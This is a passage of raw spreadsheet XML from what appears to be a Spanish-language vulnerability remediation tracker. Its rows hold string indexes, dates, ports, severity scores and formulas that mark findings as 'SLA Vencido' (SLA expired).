        <v>43816</v>
      </c>
      <c r="U92" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V92" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W92" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X92" s="11"/>
      <c r="Y92" s="11"/>
      <c r="Z92" s="11"/>
      <c r="AA92" s="8">
        <v>43969</v>
      </c>
      <c r="AB92" s="9" t="s">
        <v>355</v>
      </c>
      <c r="AC92" s="9" t="s">
        <v>356</v>
      </c>
      <c r="AD92" s="36"/>
      <c r="AE92" s="4"/>
      <c r="AF92" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG92" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH92" t="str">
        <f>IFERROR(VLOOKUP(H92,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="93" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A93" s="5">
        <v>92</v>
      </c>
      <c r="B93" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C93" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D93" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E93" s="4"/>
      <c r="F93" s="4"/>
      <c r="G93" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H93" s="4"/>
      <c r="I93" s="4"/>
      <c r="J93" s="4" t="s">
        <v>350</v>
      </c>
      <c r="K93" s="4" t="s">
        <v>351</v>
      </c>
      <c r="L93" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M93" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N93" s="4"/>
      <c r="O93" s="6"/>
      <c r="P93" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q93" s="6"/>
      <c r="R93" s="4">
        <v>443</v>
      </c>
      <c r="S93" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T93" s="8">
        <v>43812</v>
      </c>
      <c r="U93" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V93" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W93" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X93" s="11"/>
      <c r="Y93" s="11"/>
      <c r="Z93" s="11"/>
      <c r="AA93" s="8">
        <v>43969</v>
      </c>
      <c r="AB93" s="9" t="s">
        <v>355</v>
      </c>
      <c r="AC93" s="9" t="s">
        <v>356</v>
      </c>
      <c r="AD93" s="36"/>
      <c r="AE93" s="4"/>
      <c r="AF93" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG93" s="27"/>
      <c r="AH93" t="str">
        <f>IFERROR(VLOOKUP(H93,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="94" spans="1:34" ht="174" hidden="1" x14ac:dyDescent="0.35">
      <c r="A94" s="5">
        <v>93</v>
      </c>
      <c r="B94" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C94" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D94" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E94" s="4"/>
      <c r="F94" s="4"/>
      <c r="G94" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H94" s="4"/>
      <c r="I94" s="4"/>
      <c r="J94" s="4" t="s">
        <v>357</v>
      </c>
      <c r="K94" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L94" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M94" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N94" s="4"/>
      <c r="O94" s="6"/>
      <c r="P94" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q94" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R94" s="4">
        <v>443</v>
      </c>
      <c r="S94" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T94" s="8">
        <v>43816</v>
      </c>
      <c r="U94" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V94" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W94" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X94" s="12"/>
      <c r="Y94" s="12"/>
      <c r="Z94" s="12"/>
      <c r="AA94" s="8">
        <v>44069</v>
      </c>
      <c r="AB94" s="9" t="s">
        <v>358</v>
      </c>
      <c r="AC94" s="9" t="s">
        <v>359</v>
      </c>
      <c r="AD94" s="36"/>
      <c r="AE94" s="4"/>
      <c r="AF94" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG94" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH94" t="str">
        <f>IFERROR(VLOOKUP(H94,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="95" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A95" s="5">
        <v>94</v>
      </c>
      <c r="B95" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C95" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D95" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E95" s="4" t="s">
        <v>360</v>
      </c>
      <c r="F95" s="4"/>
      <c r="G95" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H95" s="4"/>
      <c r="I95" s="4"/>
      <c r="J95" s="4" t="s">
        <v>361</v>
      </c>
      <c r="K95" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L95" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M95" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N95" s="4"/>
      <c r="O95" s="6"/>
      <c r="P95" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q95" s="6" t="s">
        <v>44</v>
      </c>
      <c r="R95" s="4">
        <v>443</v>
      </c>
      <c r="S95" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T95" s="8">
        <v>43816</v>
      </c>
      <c r="U95" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V95" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W95" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X95" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y95" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z95" s="30" t="s">
        <v>177</v>
      </c>
      <c r="AA95" s="8">
        <v>44025</v>
      </c>
      <c r="AB95" s="9" t="s">
        <v>362</v>
      </c>
      <c r="AC95" s="9" t="s">
        <v>363</v>
      </c>
      <c r="AD95" s="36" t="s">
        <v>364</v>
      </c>
      <c r="AE95" s="27">
        <v>44012</v>
      </c>
      <c r="AF95" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG95" s="27"/>
      <c r="AH95" t="str">
        <f>IFERROR(VLOOKUP(H95,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="96" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A96" s="5">
        <v>95</v>
      </c>
      <c r="B96" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C96" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D96" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E96" s="4"/>
      <c r="F96" s="4"/>
      <c r="G96" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H96" s="4"/>
      <c r="I96" s="4"/>
      <c r="J96" s="4" t="s">
        <v>361</v>
      </c>
      <c r="K96" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L96" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M96" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N96" s="4"/>
      <c r="O96" s="6"/>
      <c r="P96" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q96" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R96" s="4">
        <v>80</v>
      </c>
      <c r="S96" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T96" s="8">
        <v>43816</v>
      </c>
      <c r="U96" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V96" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W96" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X96" s="12"/>
      <c r="Y96" s="12"/>
      <c r="Z96" s="12"/>
      <c r="AA96" s="8">
        <v>43969</v>
      </c>
      <c r="AB96" s="9" t="s">
        <v>365</v>
      </c>
      <c r="AC96" s="9" t="s">
        <v>366</v>
      </c>
      <c r="AD96" s="36"/>
      <c r="AE96" s="4"/>
      <c r="AF96" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG96" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH96" t="str">
        <f>IFERROR(VLOOKUP(H96,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="97" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A97" s="5">
        <v>96</v>
      </c>
      <c r="B97" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C97" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D97" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E97" s="4"/>
      <c r="F97" s="4"/>
      <c r="G97" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H97" s="4"/>
      <c r="I97" s="4"/>
      <c r="J97" s="4" t="s">
        <v>361</v>
      </c>
      <c r="K97" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L97" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M97" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N97" s="4"/>
      <c r="O97" s="6"/>
      <c r="P97" s="6"/>
      <c r="Q97" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R97" s="4">
        <v>443</v>
      </c>
      <c r="S97" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T97" s="8">
        <v>43816</v>
      </c>
      <c r="U97" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V97" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W97" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X97" s="11"/>
      <c r="Y97" s="11"/>
      <c r="Z97" s="11"/>
      <c r="AA97" s="8">
        <v>43969</v>
      </c>
      <c r="AB97" s="9" t="s">
        <v>365</v>
      </c>
      <c r="AC97" s="9" t="s">
        <v>366</v>
      </c>
      <c r="AD97" s="36"/>
      <c r="AE97" s="4"/>
      <c r="AF97" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG97" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH97" t="str">
        <f>IFERROR(VLOOKUP(H97,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="98" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A98" s="5">
        <v>97</v>
      </c>
      <c r="B98" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C98" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D98" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E98" s="4"/>
      <c r="F98" s="4"/>
      <c r="G98" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H98" s="4"/>
      <c r="I98" s="4"/>
      <c r="J98" s="4" t="s">
        <v>367</v>
      </c>
      <c r="K98" s="4" t="s">
        <v>368</v>
      </c>
      <c r="L98" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M98" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N98" s="4"/>
      <c r="O98" s="6"/>
      <c r="P98" s="6"/>
      <c r="Q98" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R98" s="4">
        <v>443</v>
      </c>
      <c r="S98" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T98" s="8">
        <v>43816</v>
      </c>
      <c r="U98" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V98" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W98" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X98" s="11"/>
      <c r="Y98" s="11"/>
      <c r="Z98" s="11"/>
      <c r="AA98" s="8">
        <v>43969</v>
      </c>
      <c r="AB98" s="9" t="s">
        <v>369</v>
      </c>
      <c r="AC98" s="9" t="s">
        <v>370</v>
      </c>
      <c r="AD98" s="36"/>
      <c r="AE98" s="4"/>
      <c r="AF98" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG98" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH98" t="str">
        <f>IFERROR(VLOOKUP(H98,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="99" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A99" s="5">
        <v>98</v>
      </c>
      <c r="B99" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C99" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D99" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E99" s="4"/>
      <c r="F99" s="4"/>
      <c r="G99" s="6" t="s">
        <v>372</v>
      </c>
      <c r="H99" s="4" t="s">
        <v>373</v>
      </c>
      <c r="I99" s="4"/>
      <c r="J99" s="4" t="s">
        <v>374</v>
      </c>
      <c r="K99" s="4"/>
      <c r="L99" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M99" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N99" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O99" s="6" t="s">
        <v>375</v>
      </c>
      <c r="P99" s="6" t="s">
        <v>376</v>
      </c>
      <c r="Q99" s="6" t="s">
        <v>372</v>
      </c>
      <c r="R99" s="4"/>
      <c r="S99" s="22"/>
      <c r="T99" s="8">
        <v>43866</v>
      </c>
      <c r="U99" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2343</v>
      </c>
      <c r="V99" s="8">
        <f t="shared" si="4"/>
        <v>43876</v>
      </c>
      <c r="W99" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X99" s="11"/>
      <c r="Y99" s="11"/>
      <c r="Z99" s="11"/>
      <c r="AA99" s="8">
        <v>43952</v>
      </c>
      <c r="AB99" s="9"/>
      <c r="AC99" s="9" t="s">
        <v>377</v>
      </c>
      <c r="AD99" s="32" t="s">
        <v>378</v>
      </c>
      <c r="AE99" s="9"/>
      <c r="AF99" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG99" s="27"/>
      <c r="AH99" t="str">
        <f>IFERROR(VLOOKUP(H99,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="100" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A100" s="5">
        <v>99</v>
      </c>
      <c r="B100" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C100" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D100" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E100" s="4"/>
      <c r="F100" s="4"/>
      <c r="G100" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H100" s="4" t="s">
        <v>380</v>
      </c>
      <c r="I100" s="4"/>
      <c r="J100" s="4" t="s">
        <v>381</v>
      </c>
      <c r="K100" s="4"/>
      <c r="L100" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M100" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N100" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O100" s="6"/>
      <c r="P100" s="6" t="s">
        <v>382</v>
      </c>
      <c r="Q100" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R100" s="4"/>
      <c r="S100" s="22"/>
      <c r="T100" s="8">
        <v>43896</v>
      </c>
      <c r="U100" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2313</v>
      </c>
      <c r="V100" s="8">
        <f t="shared" si="4"/>
        <v>43986</v>
      </c>
      <c r="W100" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X100" s="11"/>
      <c r="Y100" s="11"/>
      <c r="Z100" s="11"/>
      <c r="AA100" s="8">
        <v>43891</v>
      </c>
      <c r="AB100" s="9" t="s">
        <v>383</v>
      </c>
      <c r="AC100" s="9" t="s">
        <v>384</v>
      </c>
      <c r="AD100" s="32" t="s">
        <v>385</v>
      </c>
      <c r="AE100" s="9"/>
      <c r="AF100" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG100" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH100" t="str">
        <f>IFERROR(VLOOKUP(H100,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="101" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A101" s="5">
        <v>100</v>
      </c>
      <c r="B101" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C101" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D101" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E101" s="4"/>
      <c r="F101" s="4"/>
      <c r="G101" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H101" s="4" t="s">
        <v>386</v>
      </c>
      <c r="I101" s="4"/>
      <c r="J101" s="4" t="s">
        <v>387</v>
      </c>
      <c r="K101" s="4"/>
      <c r="L101" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M101" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N101" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O101" s="6" t="s">
        <v>388</v>
      </c>
      <c r="P101" s="6" t="s">
        <v>175</v>
      </c>
      <c r="Q101" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R101" s="4">
        <v>443</v>
      </c>
      <c r="S101" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T101" s="8">
        <v>43921</v>
      </c>
      <c r="U101" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2288</v>
      </c>
      <c r="V101" s="8">
        <f t="shared" si="4"/>
        <v>44011</v>
      </c>
      <c r="W101" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X101" s="11"/>
      <c r="Y101" s="11"/>
      <c r="Z101" s="11"/>
      <c r="AA101" s="8">
        <v>44113</v>
      </c>
      <c r="AB101" s="9"/>
      <c r="AC101" s="9" t="s">
        <v>389</v>
      </c>
      <c r="AD101" s="32" t="s">
        <v>390</v>
      </c>
      <c r="AE101" s="8">
        <v>44119</v>
      </c>
      <c r="AF101" s="27" t="s">
        <v>391</v>
      </c>
      <c r="AG101" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH101" t="str">
        <f>IFERROR(VLOOKUP(H101,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="102" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A102" s="5">
        <v>101</v>
      </c>
      <c r="B102" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C102" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D102" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E102" s="4" t="s">
        <v>392</v>
      </c>
      <c r="F102" s="4" t="s">
        <v>393</v>
      </c>
      <c r="G102" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H102" s="9" t="s">
        <v>394</v>
      </c>
      <c r="I102" s="4" t="s">
        <v>395</v>
      </c>
      <c r="J102" s="4" t="s">
        <v>396</v>
      </c>
      <c r="K102" s="4"/>
      <c r="L102" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M102" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N102" s="5">
        <v>3.7</v>
      </c>
      <c r="O102" s="14" t="s">
        <v>397</v>
      </c>
      <c r="P102" s="6" t="s">
        <v>382</v>
      </c>
      <c r="Q102" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R102" s="4">
        <v>443</v>
      </c>
      <c r="S102" s="22"/>
      <c r="T102" s="8">
        <v>43984</v>
      </c>
      <c r="U102" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2225</v>
      </c>
      <c r="V102" s="8">
        <f t="shared" si="4"/>
        <v>44104</v>
      </c>
      <c r="W102" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X102" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y102" s="30" t="s">
        <v>398</v>
      </c>
      <c r="Z102" s="30" t="s">
        <v>399</v>
      </c>
      <c r="AA102" s="8">
        <v>44784</v>
      </c>
      <c r="AB102" s="9" t="s">
        <v>400</v>
      </c>
      <c r="AC102" s="9" t="s">
        <v>401</v>
      </c>
      <c r="AD102" s="32" t="s">
        <v>402</v>
      </c>
      <c r="AE102" s="27" t="s">
        <v>403</v>
      </c>
      <c r="AF102" s="9" t="s">
        <v>404</v>
      </c>
      <c r="AG102" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH102" t="str">
        <f>IFERROR(VLOOKUP(H102,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="103" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A103" s="5">
        <v>102</v>
      </c>
      <c r="B103" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C103" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D103" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E103" s="4" t="s">
        <v>405</v>
      </c>
      <c r="F103" s="4"/>
      <c r="G103" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H103" s="4" t="s">
        <v>406</v>
      </c>
      <c r="I103" s="4" t="s">
        <v>407</v>
      </c>
      <c r="J103" s="4" t="s">
        <v>408</v>
      </c>
      <c r="K103" s="4"/>
      <c r="L103" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M103" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N103" s="5">
        <v>8.3000000000000007</v>
      </c>
      <c r="O103" s="6" t="s">
        <v>409</v>
      </c>
      <c r="P103" s="6" t="s">
        <v>382</v>
      </c>
      <c r="Q103" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R103" s="4">
        <v>443</v>
      </c>
      <c r="S103" s="22"/>
      <c r="T103" s="8">
        <v>43984</v>
      </c>
      <c r="U103" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2225</v>
      </c>
      <c r="V103" s="8">
        <f t="shared" si="4"/>
        <v>43994</v>
      </c>
      <c r="W103" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X103" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y103" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z103" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA103" s="13">
        <v>44235</v>
      </c>
      <c r="AB103" s="9" t="s">
        <v>410</v>
      </c>
      <c r="AC103" s="9" t="s">
        <v>411</v>
      </c>
      <c r="AD103" s="32" t="s">
        <v>412</v>
      </c>
      <c r="AE103" s="27">
        <v>44219</v>
      </c>
      <c r="AF103" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG103" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH103" t="str">
        <f>IFERROR(VLOOKUP(H103,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="104" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A104" s="5">
        <v>103</v>
      </c>
      <c r="B104" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C104" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D104" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E104" s="4"/>
      <c r="F104" s="4"/>
      <c r="G104" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H104" s="4" t="s">
        <v>413</v>
      </c>
      <c r="I104" s="4" t="s">
        <v>414</v>
      </c>
      <c r="J104" s="4" t="s">
        <v>415</v>
      </c>
      <c r="K104" s="4"/>
      <c r="L104" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M104" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N104" s="5">
        <v>5.3</v>
      </c>
      <c r="O104" s="6"/>
      <c r="P104" s="6" t="s">
        <v>382</v>
      </c>
      <c r="Q104" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R104" s="4">
        <v>443</v>
      </c>
      <c r="S104" s="22"/>
      <c r="T104" s="8">
        <v>43984</v>
      </c>
      <c r="U104" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2225</v>
      </c>
      <c r="V104" s="8">
        <f t="shared" si="4"/>
        <v>44074</v>
      </c>
      <c r="W104" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X104" s="11"/>
      <c r="Y104" s="11"/>
      <c r="Z104" s="11"/>
      <c r="AA104" s="8">
        <v>44053</v>
      </c>
      <c r="AB104" s="9" t="s">
        <v>416</v>
      </c>
      <c r="AC104" s="9" t="s">
        <v>417</v>
      </c>
      <c r="AD104" s="32" t="s">
        <v>418</v>
      </c>
      <c r="AE104" s="27">
        <v>44046</v>
      </c>
      <c r="AF104" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG104" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH104" t="str">
        <f>IFERROR(VLOOKUP(H104,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="105" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A105" s="5">
        <v>104</v>
      </c>
      <c r="B105" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C105" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D105" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E105" s="4"/>
      <c r="F105" s="4"/>
      <c r="G105" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H105" s="4" t="s">
        <v>419</v>
      </c>
      <c r="I105" s="4" t="s">
        <v>420</v>
      </c>
      <c r="J105" s="4" t="s">
        <v>421</v>
      </c>
      <c r="K105" s="4"/>
      <c r="L105" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M105" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N105" s="5">
        <v>3.7</v>
      </c>
      <c r="O105" s="6"/>
      <c r="P105" s="6" t="s">
        <v>382</v>
      </c>
      <c r="Q105" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R105" s="4">
        <v>443</v>
      </c>
      <c r="S105" s="22"/>
      <c r="T105" s="8">
        <v>43984</v>
      </c>
      <c r="U105" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2225</v>
      </c>
      <c r="V105" s="8">
        <f t="shared" si="4"/>
        <v>44104</v>
      </c>
      <c r="W105" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X105" s="11"/>
      <c r="Y105" s="11"/>
      <c r="Z105" s="11"/>
      <c r="AA105" s="8">
        <v>44053</v>
      </c>
      <c r="AB105" s="9" t="s">
        <v>422</v>
      </c>
      <c r="AC105" s="9" t="s">
        <v>423</v>
      </c>
      <c r="AD105" s="32" t="s">
        <v>424</v>
      </c>
      <c r="AE105" s="27">
        <v>44046</v>
      </c>
      <c r="AF105" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG105" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH105" t="str">
        <f>IFERROR(VLOOKUP(H105,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="106" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A106" s="5">
        <v>105</v>
      </c>
      <c r="B106" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C106" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D106" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E106" s="4"/>
      <c r="F106" s="4"/>
      <c r="G106" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H106" s="4"/>
      <c r="I106" s="4"/>
      <c r="J106" s="4" t="s">
        <v>426</v>
      </c>
      <c r="K106" s="4"/>
      <c r="L106" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M106" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N106" s="5"/>
      <c r="O106" s="6"/>
      <c r="P106" s="6"/>
      <c r="Q106" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R106" s="4"/>
      <c r="S106" s="22"/>
      <c r="T106" s="8">
        <v>43936</v>
      </c>
      <c r="U106" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2273</v>
      </c>
      <c r="V106" s="8">
        <f t="shared" si="4"/>
        <v>44056</v>
      </c>
      <c r="W106" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X106" s="11"/>
      <c r="Y106" s="11"/>
      <c r="Z106" s="11"/>
      <c r="AA106" s="8">
        <v>44174</v>
      </c>
      <c r="AB106" s="9" t="s">
        <v>428</v>
      </c>
      <c r="AC106" s="9" t="s">
        <v>429</v>
      </c>
      <c r="AD106" s="32"/>
      <c r="AE106" s="8">
        <v>44170</v>
      </c>
      <c r="AF106" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG106" s="27" t="s">
        <v>149</v>
      </c>
